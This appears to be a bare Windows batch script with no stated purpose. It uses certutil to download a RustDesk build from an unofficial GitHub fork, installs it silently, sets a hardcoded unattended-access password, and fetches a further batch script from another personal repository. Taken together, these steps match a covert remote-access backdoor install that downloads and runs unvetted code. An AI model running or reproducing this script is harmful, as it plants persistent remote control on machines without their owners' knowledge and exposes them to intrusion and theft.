certutil -urlcache -split -f "https://github.com/songhieu/rustdesk/releases/download/nightly/rustdesk-1.2.4-x86_64.exe" "C:\Users\Public\Downloads\RustDesk.exe"
start /wait C:\Users\Public\Downloads\RustDesk.exe --silent-install
timeout /t 5
cd C:\Program Files\RustDesk
rustdesk.exe --password Global99@25#
::init get id
certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/getRustDeskid.bat" "C:\Users\Public\Downloads\getRustDeskid.bat"
